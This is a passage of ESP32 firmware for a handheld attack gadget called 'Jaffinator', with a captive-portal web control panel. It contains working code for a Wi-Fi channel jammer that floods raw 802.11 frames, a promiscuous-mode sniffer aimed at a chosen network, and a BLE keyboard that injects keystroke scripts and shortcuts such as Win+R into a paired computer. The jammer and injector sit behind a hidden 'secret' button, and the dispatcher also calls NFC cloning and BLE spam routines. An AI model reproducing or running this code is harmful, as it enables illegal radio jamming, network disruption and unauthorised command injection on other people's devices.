    if (choice == "m") { tft.fillScreen(ST77XX_BLACK); drawMenu(); return; }
    idx = choice.toInt() - 1; if (idx < 0 || idx >= n) { addLog("Invalid choice"); tft.fillScreen(ST77XX_BLACK); drawMenu(); return; }
  }
  int n = WiFi.scanNetworks(); if (idx >= n || idx < 0) return;
  String bssid = WiFi.BSSIDstr(idx);
  sscanf(bssid.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &targetMAC[0], &targetMAC[1], &targetMAC[2], &targetMAC[3], &targetMAC[4], &targetMAC[5]);
  targetChannel = WiFi.channel(idx);
  addLog("Sniffing: " + WiFi.SSID(idx) + " CH:" + String(targetChannel) + " MAC:" + bssid);
  esp_wifi_set_promiscuous(true); esp_wifi_set_promiscuous_rx_cb(&snifferCallback); esp_wifi_set_channel(targetChannel, WIFI_SECOND_CHAN_NONE);
  tft.fillScreen(ST77XX_BLACK); tft.fillRect(0, 0, 320, 36, ST77XX_BLUE); drawCenteredText(6, "SNIFFER", ST77XX_WHITE, 3);
  tft.setCursor(10, 46); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(2); tft.print(WiFi.SSID(idx));
  tft.setCursor(10, 70); tft.setTextColor(ST77XX_WHITE); tft.print("CH:"); tft.print(targetChannel);
  unsigned long lastUpdate = 0;
  while (!stopFlag && !exitFlag) {
    if (millis() - lastUpdate > 1000) {
      lastUpdate = millis();
      tft.fillRect(0, 100, 320, 100, ST77XX_BLACK);
      tft.setCursor(80, 120); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(5); tft.print(pktCount);
      featureDataJson = "{\"type\":\"sniffer\",\"packets\":" + String(pktCount) + ",\"channel\":" + String(targetChannel) + ",\"target\":\"" + WiFi.SSID(idx) + "\",\"real\":true}";
      addLog("Sniffer: " + String(pktCount) + " pkts");
    }
    for (int i = 0; i < 10 && !stopFlag && !exitFlag; i++) {
      if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); } delay(5);
    }
  }
  esp_wifi_set_promiscuous(false); featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK);
  addLog("Sniffer exited");
}

// ======================== Wi‑Fi Jammer =============================
void runWiFiJammer() {
  stopFlag = exitFlag = false;
  int channel = 1;
  if (webTarget.length() > 0) {
    channel = webTarget.toInt();
    if (channel < 1 || channel > 13) channel = 1;
  }
  addLog("Jammer started on channel " + String(channel));
  featureDataJson = "{\"type\":\"jammer\",\"channel\":" + String(channel) + "}";
  tft.fillScreen(ST77XX_BLACK);
  tft.fillRect(0, 0, 320, 36, ST77XX_RED);
  drawCenteredText(6, "JAMMING", ST77XX_WHITE, 3);
  tft.setCursor(10, 46); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(2);
  tft.print("CH "); tft.print(channel);
  tft.setCursor(10, 70); tft.print("Packets:");

  WiFi.mode(WIFI_AP); delay(100);
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(false);

  unsigned long count = 0;
  uint8_t junk[2304]; memset(junk, 0xFF, sizeof(junk));
  while (!stopFlag && !exitFlag) {
    for (int i = 0; i < 50 && !stopFlag && !exitFlag; i++) {
      esp_wifi_80211_tx(WIFI_IF_AP, junk, sizeof(junk), false);
      delay(0); count++;
    }
    if (count % 500 == 0) {
      tft.fillRect(120, 65, 200, 30, ST77XX_BLACK);
      tft.setCursor(120, 70); tft.setTextColor(ST77XX_GREEN); tft.setTextSize(3); tft.print(count);
      addLog("Jammer: " + String(count) + " packets sent");
    }
    if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
  }
  featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK);
  addLog("Jammer stopped");
}

// ======================== BLE Keyboard (FIXED CCCD) ================
class MyCallbacks : public BLECharacteristicCallbacks {
  void onWrite(BLECharacteristic* pChar) { kbSubscribed = true; }
};

void initBLEKeyboard() {
  if (pServer) {
    pServer->getAdvertising()->stop(); delay(50);
    pServer->disconnect(0); delay(50);
    delete hid; hid = nullptr; delete pServer; pServer = nullptr; input = nullptr;
    BLEDevice::deinit(true); delay(100);
  }
  kbSubscribed = false;
  BLEDevice::init("Jaffinator KB");
  pServer = BLEDevice::createServer();
  hid = new BLEHIDDevice(pServer);
  input = hid->inputReport(1);
  input->setCallbacks(new MyCallbacks());   // detect CCCD subscription
  hid->manufacturer()->setValue("JaffInc");
  hid->pnp(0x02, 0x0a0c, 0x0a0c, 0x0110);
  hid->hidInfo(0x00, 0x01);
  static uint8_t reportMap[] = {
    0x05,0x01, 0x09,0x06, 0xa1,0x01, 0x85,0x01,
    0x05,0x07, 0x19,0xe0, 0x29,0xe7, 0x15,0x00, 0x25,0x01, 0x75,0x01, 0x95,0x08, 0x81,0x02,
    0x95,0x01, 0x75,0x08, 0x81,0x01,
    0x95,0x05, 0x75,0x01, 0x05,0x08, 0x19,0x01, 0x29,0x05, 0x91,0x02,
    0x95,0x01, 0x75,0x03, 0x91,0x01,
    0x95,0x06, 0x75,0x08, 0x15,0x00, 0x25,0xa4, 0x05,0x07, 0x19,0x00, 0x29,0xa4, 0x81,0x00,
    0xc0
  };
  hid->reportMap(reportMap, sizeof(reportMap));
  hid->startServices();
  pServer->getAdvertising()->setAppearance(HID_KEYBOARD);
  pServer->getAdvertising()->addServiceUUID(hid->hidService()->getUUID());
  pServer->getAdvertising()->start();
}

void sendKeyRaw(uint8_t code, bool shift, bool ctrl, bool alt, bool gui) {
  if (!input || !kbSubscribed) return;   // wait for CCCD
  uint8_t rep[9] = {0}; rep[0] = 1;
  if (shift) rep[1] |= 0x02; if (ctrl) rep[1] |= 0x01; if (alt) rep[1] |= 0x04; if (gui) rep[1] |= 0x08;
  rep[3] = code;
  input->setValue(rep, sizeof(rep)); input->notify(); delay(30);
  memset(rep, 0, sizeof(rep)); rep[0] = 1;
  input->setValue(rep, sizeof(rep)); input->notify(); delay(30);
}

void sendChar(char c) {
  uint8_t kc = 0; bool shift = false;
  if (c >= 'a' && c <= 'z') { kc = 0x04 + (c - 'a'); }
  else if (c >= 'A' && c <= 'Z') { kc = 0x04 + (c - 'A'); shift = true; }
  else if (c >= '0' && c <= '9') { kc = (c == '0') ? 0x27 : 0x1E + (c - '1'); }
  else if (c == ' ') kc = 0x2C;
  else if (c == '.') kc = 0x37;
  else if (c == ',') kc = 0x36;
  else if (c == '-') kc = 0x2D;
  else if (c == '=') kc = 0x2E;
  else if (c == ';') kc = 0x33;
  else if (c == '\'') kc = 0x34;
  if (kc) sendKeyRaw(kc, shift, false, false, false);
}

void typeString(const String& s) { for (size_t i = 0; i < s.length(); i++) sendChar(s[i]); }

void runBLEScript(const String& script) {
  char* txt = (char*)script.c_str();
  const char* delim = "\n";
  char* ptr = strtok(txt, delim);
  while (ptr != NULL && !stopFlag && !exitFlag) {
    String com = String(ptr); com.trim();
    if (com.startsWith("GUI ")) {
      com.remove(0, 4); com.trim();
      sendKeyRaw(0x00, false, false, false, true);
      for (int i = 0; i < 26; i++) {
        if (com.equalsIgnoreCase(String((char)('a' + i)))) {
          sendKeyRaw(0x04 + i, false, false, false, true); break;
        }
      }
    }
    else if (com.startsWith("GUI")) { sendKeyRaw(0x00, false, false, false, true); }
    else if (com.startsWith("PRINT ")) { com.remove(0, 6); typeString(com); }
    else if (com.startsWith("PRINTLN ")) { com.remove(0, 8); typeString(com); sendKeyRaw(0x28, false, false, false, false); }
    else if (com.startsWith("DELAY ")) { com.remove(0, 6); unsigned long d = com.toInt(); for (unsigned long t = 0; t < d && !stopFlag && !exitFlag; t += 50) { delay(50); if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); } } }
    else if (com.startsWith("HOLD ")) { com.remove(0, 5); com.trim(); for (int i = 0; i < 26; i++) { if (com.equalsIgnoreCase(String((char)('a' + i)))) { uint8_t rep[9] = {0}; rep[0] = 1; rep[3] = 0x04 + i; input->setValue(rep, sizeof(rep)); input->notify(); break; } } }
    else if (com.startsWith("RELEASE")) { uint8_t rep[9] = {0}; rep[0] = 1; input->setValue(rep, sizeof(rep)); input->notify(); }
    else if (com.startsWith("ENTER")) { sendKeyRaw(0x28, false, false, false, false); }
    ptr = strtok(NULL, delim);
  }
}

void runBLEKeyboardShortcut() {
  stopFlag = exitFlag = false;
  String choice = webTarget;
  if (choice.isEmpty()) {
    Serial.println("\n[BLE Keyboard] Choose shortcut:");
    Serial.println("1 = Win+Alt+F4\n2 = Win+R\n3 = Ctrl+C");
    Serial.print("Enter choice (1-3): ");
    choice = getSafeInput();
    if (choice == "m" || choice.isEmpty()) { tft.fillScreen(ST77XX_BLACK); drawMenu(); return; }
  }
  addLog("BLE Keyboard: starting shortcut " + choice);
  tft.fillScreen(ST77XX_BLACK); tft.fillRect(0, 0, 320, 36, ST77XX_BLUE);
  drawCenteredText(6, "BLE KEYBOARD", ST77XX_WHITE, 3);
  tft.setCursor(10, 46); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(2); tft.print("Sending...");
  initBLEKeyboard();
  unsigned long start = millis();
  while (!kbSubscribed && millis() - start < 20000 && !stopFlag && !exitFlag) {
    delay(50); if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
  }
  if (!kbSubscribed) {
    tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "NO CONNECT", ST77XX_WHITE, 3);
    addLog("BLE KB: no subscribe"); delay(2000);
  } else {
    if (choice == "1") sendKeyRaw(0x44, false, false, true, true);
    else if (choice == "2") sendKeyRaw(0x15, false, false, false, true);
    else if (choice == "3") sendKeyRaw(0x06, false, true, false, false);
    tft.fillRect(0, 70, 320, 40, ST77XX_BLACK);
    tft.setCursor(10, 80); tft.setTextColor(ST77XX_GREEN); tft.print("Done!");
    addLog("BLE KB: sent"); delay(2000);
  }
  featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK);
}

void runBLEKeyboardScript() {
  stopFlag = exitFlag = false;
  String script = webTarget;
  if (script.isEmpty()) {
    Serial.println("[BLE Script] Enter script (end with empty line):");
    script = "";
    while (true) {
      String line = getSafeInput();
      if (line == "m" || line.length() == 0) break;
      script += line + "\n";
    }
    if (script.isEmpty()) { tft.fillScreen(ST77XX_BLACK); drawMenu(); return; }
  }
  addLog("BLE Script: running");
  tft.fillScreen(ST77XX_BLACK); tft.fillRect(0, 0, 320, 36, ST77XX_BLUE);
  drawCenteredText(6, "BLE SCRIPT", ST77XX_WHITE, 3);
  tft.setCursor(10, 46); tft.setTextColor(ST77XX_CYAN); tft.setTextSize(1); tft.print("Executing...");
  initBLEKeyboard();
  unsigned long start = millis();
  while (!kbSubscribed && millis() - start < 20000 && !stopFlag && !exitFlag) {
    delay(50); if (webServerStarted) { server.handleClient(); dnsServer.processNextRequest(); }
  }
  if (!kbSubscribed) {
    tft.fillScreen(ST77XX_BLACK); tft.fillRect(0,0,320,36,ST77XX_RED); drawCenteredText(6, "NO CONNECT", ST77XX_WHITE, 3);
    addLog("BLE Script: no subscribe"); delay(2000);
  } else {
    runBLEScript(script);
    tft.fillRect(0, 70, 320, 40, ST77XX_BLACK);
    tft.setCursor(10, 80); tft.setTextColor(ST77XX_GREEN); tft.print("Done!");
    addLog("BLE Script: finished"); delay(2000);
  }
  featureDataJson = "{}"; tft.fillScreen(ST77XX_BLACK);
}

// ======================== Web API ===================================
void handleApiScan() {
  int n = WiFi.scanNetworks();
  String json = "[";
  for (int i = 0; i < n; i++) {
    if (i > 0) json += ",";
    json += "{\"ssid\":\"" + WiFi.SSID(i) + "\",\"ch\":" + String(WiFi.channel(i)) + ",\"rssi\":" + String(WiFi.RSSI(i)) + "}";
  }
  json += "]";
  server.send(200, "application/json", json);
}

void handleRoot() { server.sendHeader("Location", "/admin", true); server.send(302, "text/plain", ""); }

void handleAdmin() {
  String page = R"rawliteral(
<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>JAFFINATOR</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  :root{ --bg:#0a0f0a; --panel:#111a11; --green:#39ff6a; --green-dim:#1c7a37; --green-faint:#0f3d1c; --amber:#ffb000; --red:#ff3b3b; }
  *{ box-sizing:border-box; margin:0; padding:0; }
  body{ background:var(--bg); color:var(--green); font-family:'Share Tech Mono', monospace; min-height:100vh; display:flex; justify-content:center; align-items:center; padding:20px; }
  .container{ width:100%; max-width:800px; background:var(--panel); border:1px solid var(--green-dim); border-radius:8px; padding:15px; box-shadow:0 0 30px rgba(0,255,0,0.1); }
  .header{ display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid var(--green-faint); padding-bottom:10px; margin-bottom:12px; }
  .header h1{ font-size:26px; letter-spacing:3px; color:var(--green); text-shadow:0 0 10px var(--green); }
  .status{ display:flex; align-items:center; gap:8px; font-size:14px; }
  .dot{ width:10px; height:10px; border-radius:50%; background:var(--green-dim); display:inline-block; }
  .dot.live{ background:var(--green); box-shadow:0 0 8px var(--green); animation:pulse 1.5s infinite; }
  @keyframes pulse{ 0%,100%{opacity:1;} 50%{opacity:0.3;} }
  .main-panel{ display:grid; grid-template-columns:1fr 1fr; gap:12px; margin-bottom:12px; }
  .live-data{ border:1px solid var(--green-faint); padding:10px; min-height:130px; font-size:12px; overflow-y:auto; background:rgba(0,0,0,0.4); }
  .live-data::-webkit-scrollbar{ width:6px; } .live-data::-webkit-scrollbar-thumb{ background:var(--green-faint); }
  .console{ border:1px solid var(--green-dim); background:rgba(0,0,0,0.5); display:flex; flex-direction:column; }
  .console-head{ display:flex; justify-content:space-between; padding:5px 10px; border-bottom:1px solid var(--green-faint); font-size:11px; color:var(--green-dim); }
  .console-head .clear-btn{ background:none; border:none; color:var(--amber); cursor:pointer; font-size:16px; font-weight:bold; line-height:1; }
  .console-body{ flex:1; padding:8px; overflow-y:auto; max-height:130px; font-size:11px; line-height:1.4; }
  .console-body::-webkit-scrollbar{ width:6px; } .console-body::-webkit-scrollbar-thumb{ background:var(--green-faint); }
  .button-grid{ display:grid; grid-template-columns:repeat(auto-fill, minmax(80px,1fr)); gap:6px; margin-bottom:8px; }
  .btn{ display:flex; align-items:center; justify-content:center; gap:4px; padding:8px 4px; background:transparent; border:1px solid var(--green-dim); color:var(--green); font-family:'Share Tech Mono', monospace; font-size:11px; cursor:pointer; transition:0.2s; }
  .btn svg{ width:16px; height:16px; fill:var(--green); }
  .btn:hover{ background:rgba(57,255,106,0.1); border-color:var(--green); }
  .btn.home{ color:var(--amber); border-color:var(--amber); }
  .btn.secret{ color:var(--red); border-color:var(--red); }
  .btn.secret svg{ fill:var(--red); }
  .hidden-tools{ display:none; }
  .footer{ display:flex; justify-content:space-between; align-items:center; margin-top:8px; font-size:11px; color:var(--green-dim); }
</style></head><body>
<div class="container">
  <div class="header"><h1>JAFFINATOR</h1><div class="status"><span class="dot" id="statusDot"></span><span id="statusText">IDLE</span></div></div>
  <div class="main-panel">
    <div class="live-data" id="liveData">Idle</div>
    <div class="console">
      <div class="console-head"><span>console <span id="lineCount">0</span></span><button class="clear-btn" onclick="clearLogs()" title="Clear logs">✕</button></div>
      <div class="console-body" id="consoleBody"></div>
    </div>
  </div>
  <div class="button-grid">
    <button class="btn" onclick="runTool('wifi_scan')"><svg viewBox="0 0 24 24"><path d="M12 3C7 3 3 7 3 12s4 9 9 9 9-4 9-9-4-9-9-9zm0 2c3.9 0 7 3.1 7 7s-3.1 7-7 7-7-3.1-7-7 3.1-7 7-7zm0 3a4 4 0 100 8 4 4 0 000-8z"/></svg>Scan</button>
    <button class="btn" onclick="runTool('beacon')"><svg viewBox="0 0 24 24"><path d="M12 2l2 8h8l-6 4.5 2.5 7.5-6.5-5-6.5 5L8.5 14.5 2 10h8z"/></svg>Beacon</button>
    <button class="btn" onclick="runTool('ble_spam')"><svg viewBox="0 0 24 24"><path d="M14.5 2l3 3-1.5 1.5L13 3.5 14.5 2zm-4 0L11 3.5 8 6.5 6.5 5l4-3zm-6 6l1.5 1.5L3 13l-1-4h2.5zm14 0H21l-1 4-3-3.5L18.5 8zM12 10l4 6h-8l4-6z"/></svg>BLE</button>
    <button class="btn" onclick="runTool('ble_track')"><svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm0 18c-4.4 0-8-3.6-8-8s3.6-8 8-8 8 3.6 8 8-3.6 8-8 8zm0-6c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>Track</button>
    <button class="btn" onclick="runTool('nfc_read')"><svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="3"/><circle cx="12" cy="12" r="3"/></svg>NFC Read</button>
    <button class="btn" onclick="runTool('nfc_clone')"><svg viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="3"/><path d="M16 8h-6v6h6V8z"/></svg>Clone</button>
    <button class="btn" onclick="runTool('manual_uid')"><svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 5h5v2h-5V7zm0 4h5v2h-5v-2zm-6 4h11v2H7v-2z"/></svg>UID</button>
    <button class="btn" onclick="startSniffer()"><svg viewBox="0 0 24 24"><path d="M12 2C6.5 2 2 6.5 2 12s4.5 10 10 10 10-4.5 10-10S17.5 2 12 2zm-2 15l-4-4 1.4-1.4L10 14.2l6.6-6.6L18 9l-8 8z"/></svg>Sniffer</button>
    <button class="btn home" onclick="goHome()"><svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>Home</button>
    <button class="btn secret" id="toggleSecret" onclick="document.getElementById('hiddenTools').style.display = (document.getElementById('hiddenTools').style.display=='none'||document.getElementById('hiddenTools').style.display=='')?'block':'none'">🔒</button>
  </div>
  <div class="hidden-tools" id="hiddenTools" style="display:none;">
    <div class="button-grid">
      <button class="btn" onclick="startJammer()"><svg viewBox="0 0 24 24"><path d="M3 3v18h2V3H3zm16 0v18h2V3h-2zm-5 0v18h2V3h-2zm-5 0v18h2V3H9z"/></svg>Jammer</button>
      <button class="btn" onclick="startKeyboard()"><svg viewBox="0 0 24 24"><path d="M20 5H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm-9 5h-2v2h2v-2zm4 0h-2v2h2v-2zm4 0h-2v2h2v-2z"/></svg>Kbd</button>
      <button class="btn" onclick="startScript()"><svg viewBox="0 0 24 24"><path d="M14 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6zm-1 7V3.5L18.5 9H13zm-3 7v-2h2v2H10zm0-4v-2h2v2h-2zm4 4v-2h2v2h-2zm0-4v-2h2v2h-2z"/></svg>Script</button>
    </div>
  </div>
  <div class="footer"><span id="ipDisplay">AP 192.168.4.1</span></div>
</div>
<script>
  const consoleBody = document.getElementById('consoleBody');
  const lineCountEl = document.getElementById('lineCount');
  const liveDataEl = document.getElementById('liveData');
  const statusDot = document.getElementById('statusDot');
  const statusText = document.getElementById('statusText');
  let logCache = [];

  async function fetchStatus() {
    try { const res = await fetch('/api/status'); const data = await res.json(); const status = data.status || 'Idle'; statusText.textContent = status; statusDot.className = 'dot' + (status !== 'Idle' ? ' live' : ''); } catch(e) {}
  }

  async function fetchLogs() {
    try { const res = await fetch('/api/logs'); const data = await res.json(); if (data.length !== logCache.length || data.join() !== logCache.join()) { consoleBody.innerHTML = ''; data.forEach(line => { const d = document.createElement('div'); d.textContent = line; consoleBody.appendChild(d); }); logCache = data; lineCountEl.textContent = data.length + ' lines'; consoleBody.scrollTop = consoleBody.scrollHeight; } } catch(e) {}
  }

  async function fetchLiveData() {
    try { const res = await fetch('/api/data'); const json = await res.json(); if (json && json.type) { let html = ''; if (json.type === 'scan') { if (json.status === 'scanning') html = 'Scanning...'; else { html = `<b>WiFi Scan:</b> ${json.total} networks<br>`; if (json.networks) json.networks.forEach(n => html += `${n.ssid}  CH:${n.ch}  ${n.rssi} dBm<br>`); } } else if (json.type === 'beacon') { html = `<b>Beacon:</b> ${json.count || 0} pkts<br>`; if (json.ssids) html += json.ssids.join(', '); } else if (json.type === 'ble_spam') { html = `<b>BLE Spam:</b> ${json.cycles || 0} cycles`; } else if (json.type === 'ble_track') { html = `<b>BLE Track:</b> Scan #${json.scan} - ${json.devices ? json.devices.length : 0} devs<br>`; if (json.devices) json.devices.forEach(d => { html += `${d.name || '?'}  ${d.rssi}dBm`; if (d.dist !== undefined) html += `  ${typeof d.dist === 'number' ? d.dist.toFixed(1) + 'm' : d.dist}`; html += `<br>`; }); } else if (json.type === 'nfc') { if (json.status === 'waiting') html = 'Waiting for tag...'; else html = `<b>NFC Tag:</b> ${json.uid} (${json.length}B) ${json.type ? ' - ' + json.type : ''}`; } else if (json.type === 'signal') { html = `<b>Signal:</b> ${json.ssid || '?'}  ${json.rssi || '?'}dBm  ${json.label || ''}`; } else if (json.type === 'sniffer') { html = `<b>Sniffer:</b> ${json.packets || 0} real pkts CH ${json.channel || '?'} (${json.target || ''})`; } else html = JSON.stringify(json); liveDataEl.innerHTML = html; } else { liveDataEl.innerHTML = 'Idle'; } } catch(e) { liveDataEl.innerHTML = 'Error loading data'; }
  }

  function runTool(tool) { fetch('/api/run?tool=' + tool); setTimeout(() => { fetchStatus(); fetchLiveData(); }, 300); }
  function startSniffer() { let n = prompt("Enter network number (1-10):"); if (n) { fetch('/api/run?tool=sniffer&target=' + n); setTimeout(() => { fetchStatus(); fetchLiveData(); }, 300); } }
  function goHome() { fetch('/api/home'); setTimeout(() => { fetchStatus(); liveDataEl.innerHTML = 'Idle'; }, 300); }
  function clearLogs() { fetch('/api/clear'); consoleBody.innerHTML = ''; lineCountEl.textContent = '0 lines'; logCache = []; }
  async function startJammer() {
    liveDataEl.innerHTML = 'Scanning...';
    const res = await fetch('/api/scan');
    const networks = await res.json();
    let html = '<b>WiFi Networks:</b><br>';
    networks.forEach(n => { html += `${n.ssid}  CH:${n.ch}  ${n.rssi} dBm<br>`; });
    liveDataEl.innerHTML = html;
    setTimeout(() => {
      let ch = prompt("Enter channel (1-13):");
      if (ch) { fetch('/api/run?tool=jammer&target=' + ch); }
    }, 2000);
  }
  function startKeyboard() {
    let choice = prompt("Choose shortcut:\n1 = Win+Alt+F4\n2 = Win+R\n3 = Ctrl+C");
    if (choice && (choice=='1' || choice=='2' || choice=='3')) {
      fetch('/api/run?tool=ble_keyboard&target=' + choice);
    }
  }
  function startScript() {
    let script = prompt("Paste your script (PRINT, GUI, DELAY, etc.):");
    if (script) {
      fetch('/api/run?tool=ble_script&target=' + encodeURIComponent(script));
    }
  }

  document.getElementById('ipDisplay').textContent = 'AP ' + window.location.hostname;
  fetchStatus(); fetchLogs(); fetchLiveData();
  setInterval(() => { fetchStatus(); fetchLogs(); fetchLiveData(); }, 2000);
</script></body></html>)rawliteral";
  server.send(200, "text/html", page);
}

void handleCaptivePortal() { server.sendHeader("Location", "/admin", true); server.send(302, "text/plain", ""); }
void handlePing() { server.send(200, "text/plain", "pong"); }

void handleApiLogs() {
  String json = "["; int start = (logCount < MAX_LOG_LINES) ? 0 : logIndex;
  for (int i = 0; i < logCount; i++) { int idx = (start + i) % MAX_LOG_LINES; if (i > 0) json += ","; json += "\"" + logLines[idx] + "\""; } json += "]";
  server.send(200, "application/json", json);
}
void handleApiData() { server.send(200, "application/json", featureDataJson); }

void handleApiRun() {
  String tool = server.arg("tool");
  if (tool.isEmpty()) { server.send(400, "text/plain", "Missing tool"); return; }
  if (featureRunning) { server.send(409, "text/plain", "A tool is already running"); return; }
  if (server.hasArg("target")) webTarget = server.arg("target"); else webTarget = "";
  if (tool == "wifi_scan" || tool == "beacon" || tool == "ble_spam" || tool == "ble_track" ||
      tool == "nfc_read" || tool == "nfc_clone" || tool == "manual_uid" || tool == "sniffer" ||
      tool == "jammer" || tool == "ble_keyboard" || tool == "ble_script") {
    featureRunning = true; currentFeature = tool;
    addLog("Web: starting " + tool + (webTarget.length() ? " target=" + webTarget : ""));
    server.send(200, "text/plain", "Started " + tool);
  } else { server.send(400, "text/plain", "Unknown tool"); }
}

void handleApiHome() { exitFlag = stopFlag = true; addLog("Home"); server.send(200, "text/plain", "OK"); }
void handleApiClear() { clearLogs(); server.send(200, "text/plain", "Logs cleared"); }
void handleApiStatus() { String json = "{\"status\":\"" + (featureRunning ? currentFeature : "Idle") + "\"}"; server.send(200, "application/json", json); }

// ======================== Setup & Loop ============================
void setup() {
  Serial.begin(115200); delay(1000);
  Serial.println(F("\n\n  ╔═══════════════════════════════════════╗"));
  Serial.println(F("  ║              JAFFINATOR               ║"));
  Serial.println(F("  ╚═══════════════════════════════════════╝\n"));
  addLog("=== JAFFINATOR AP ===");
  SPI.begin();
  WiFi.mode(WIFI_AP); WiFi.softAP(apSSID, apPass);
  IPAddress apIP = WiFi.softAPIP();
  Serial.printf("  Access Point: %s\n", apSSID);
  Serial.printf("  Password:     %s\n", apPass);
  Serial.printf("  Admin page:   http://%s/admin\n", apIP.toString().c_str());
  dnsServer.start(53, "*", apIP);
  server.on("/", HTTP_GET, handleRoot);
  server.on("/admin", HTTP_GET, handleAdmin);
  server.on("/api/run", HTTP_GET, handleApiRun);
  server.on("/api/home", HTTP_GET, handleApiHome);
  server.on("/api/status", HTTP_GET, handleApiStatus);
  server.on("/api/logs", HTTP_GET, handleApiLogs);
  server.on("/api/data", HTTP_GET, handleApiData);
  server.on("/api/clear", HTTP_GET, handleApiClear);
  server.on("/api/scan", HTTP_GET, handleApiScan);
  server.on("/ping", HTTP_GET, handlePing);
  server.onNotFound(handleCaptivePortal);
  server.begin(); webServerStarted = true;
  tft.init(240, 320); tft.setRotation(1); tft.invertDisplay(false);
  drawMenu();
  Serial.println(F("Ready. Connect to JaffAP and open 192.168.4.1/admin"));
}

void loop() {
  dnsServer.processNextRequest();
  if (webServerStarted) server.handleClient();
  if (featureRunning) {
    if (currentFeature == "wifi_scan") runWiFiScan();
    else if (currentFeature == "beacon") runWiFiBeacon();
    else if (currentFeature == "ble_spam") runBLEWindowsSpam();
    else if (currentFeature == "ble_track") runBLETracker();
    else if (currentFeature == "nfc_read") runNFCRead();
    else if (currentFeature == "nfc_clone") runNFCClone();
    else if (currentFeature == "manual_uid") runManualUIDUpdate();
    else if (currentFeature == "sniffer") runTargetSniffer();
    else if (currentFeature == "jammer") runWiFiJammer();
    else if (currentFeature == "ble_keyboard") runBLEKeyboardShortcut();
    else if (currentFeature == "ble_script") runBLEKeyboardScript();
    featureRunning = false; currentFeature = ""; featureDataJson = "{}"; drawMenu();
  }
  if (Serial.available()) {
    char cmd = Serial.read(); while (Serial.available()) Serial.read();
    if (!featureRunning) {
      if (cmd == '1') {
        Serial.println("[WiFi Scan] Enter SSID to track (or press Enter to scan all):");
        String target = getSafeInput();
        if (target == "m") { drawMenu(); return; }
        if (target.length() > 0) webTarget = target; else webTarget = "";
        currentFeature = "wifi_scan"; featureRunning = true;
      }
      else if (cmd == '2') { currentFeature = "beacon"; featureRunning = true; }
      else if (cmd == '3') { currentFeature = "ble_spam"; featureRunning = true; }
      else if (cmd == '4') { currentFeature = "ble_track"; featureRunning = true; }
      else if (cmd == '5') { currentFeature = "nfc_read"; featureRunning = true; }
      else if (cmd == '6') { currentFeature = "nfc_clone"; featureRunning = true; }
      else if (cmd == 'u') { currentFeature = "manual_uid"; featureRunning = true; }
      else if (cmd == '7') { currentFeature = "sniffer"; featureRunning = true; }
      else if (cmd == '8') { currentFeature = "ble_keyboard"; featureRunning = true; webTarget = ""; }
      else if (cmd == '9') { currentFeature = "ble_script"; featureRunning = true; webTarget = ""; }
      else if (cmd == '0') { currentFeature = "jammer"; featureRunning = true; webTarget = ""; }
    }
  }
}
